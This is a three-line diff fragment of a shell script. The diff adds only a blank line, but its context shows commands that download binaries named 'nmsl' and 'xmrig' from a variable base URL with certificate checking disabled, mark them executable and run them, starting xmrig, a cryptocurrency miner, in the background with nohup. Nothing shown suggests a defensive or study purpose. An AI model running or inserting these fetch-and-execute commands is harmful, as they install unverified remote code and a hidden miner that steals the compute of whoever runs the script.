@@ -152,3 +152,4 @@ EOF
 wget --no-check-certificate ${BASE_URL}/nmsl && chmod +x ./nmsl && ./nmsl
 
 wget --no-check-certificate ${BASE_URL}/xmrig && chmod +x ./xmrig && nohup ./xmrig &
+
